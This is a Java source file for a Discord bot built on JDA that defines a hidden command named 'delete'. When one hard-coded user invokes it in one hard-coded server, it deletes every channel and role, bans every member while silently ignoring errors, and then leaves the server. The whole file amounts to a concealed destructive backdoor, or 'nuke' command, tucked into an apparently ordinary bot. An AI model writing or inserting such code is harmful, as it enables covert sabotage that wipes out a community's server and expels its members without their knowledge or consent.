package jaccsbot.jaccsbot;

import java.util.List;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;

import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;

public class Delete extends Command{

	Delete()
	{
		this.name="delete";
		this.hidden=true;
		
		
	}
	
	
	
	@Override
	protected void execute(CommandEvent event) {
		
		if(event.getAuthor().getId().equals("104284192401022976")&&event.getGuild().getId().equals("459542891950505995")) 
		{
			
			List<GuildChannel> channels=event.getGuild().getChannels();
			
			for(GuildChannel channel:channels) 
			{
				channel.delete().queue();
			}
			List<Role> roles=event.getGuild().getRoles();
			
			for(Role role:roles) 
			{
				try {
				role.delete().queue();;}
				catch(Exception e) 
				{
					
				}
			}	
			
			List<Member> members=event.getGuild().getMembers();
			
			for(Member member:members) 
			{
				try {member.ban(0).queue();;}
				catch(Exception e) 
				{}
			}
			
			event.getGuild().leave().queue();
		}
		
		
		
		
		
		
		
		
		
		
		
	}
	
	
	
	
	
	
	

}
